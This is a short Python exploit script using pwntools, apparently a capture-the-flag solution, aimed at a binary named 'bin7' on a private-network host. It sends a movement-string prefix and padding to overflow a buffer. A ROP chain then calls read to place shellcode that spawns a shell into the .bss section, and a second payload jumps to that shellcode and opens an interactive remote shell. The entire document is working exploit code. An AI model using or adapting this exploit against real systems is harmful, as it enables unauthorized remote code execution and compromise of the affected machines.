from pwn import *

r=remote('172.16.7.10',9007)
elf=ELF('bin7')

read_addr=0x806e070
fakeret_addr=0x8048999

ROP1=''
ROP1+='lljjjllkklljjjjjjhhhjjjlllllll'
ROP1+='x'*0x2c
ROP1+=p32(read_addr)
ROP1+=p32(fakeret_addr)
ROP1+=p32(0)
ROP1+=p32(elf.bss())
ROP1+=p32(len(asm(shellcraft.sh())))

r.recvuntil('(hjkl)\n')
r.sendline(ROP1)
r.sendline(asm(shellcraft.sh()))

ROP2=''
ROP2+='lljjjllkklljjjjjjhhhjjjlllllll'
ROP2+='x'*0x2c
ROP2+=p32(elf.bss())

r.recvuntil('(hjkl)\n')
r.sendline(ROP2)

r.interactive()